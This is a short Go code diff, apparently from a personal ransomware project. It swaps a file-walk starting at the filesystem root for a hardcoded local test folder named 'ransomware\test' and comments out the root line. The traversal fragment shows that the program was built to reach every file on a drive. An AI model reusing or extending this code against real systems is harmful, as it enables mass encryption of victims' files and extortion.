@@ -57,9 +57,9 @@ func main() {
 		return
 	}
 	key := []byte(os.Args[1])
-
-	root := string(os.PathSeparator)
-	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+	targetFolder := "C:\\Users\\loulo\\Desktop\\ransomware\\test"
+	// root := string(os.PathSeparator)
+	err := filepath.Walk(targetFolder, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			fmt.Println("Erreur ", err)
 			return err
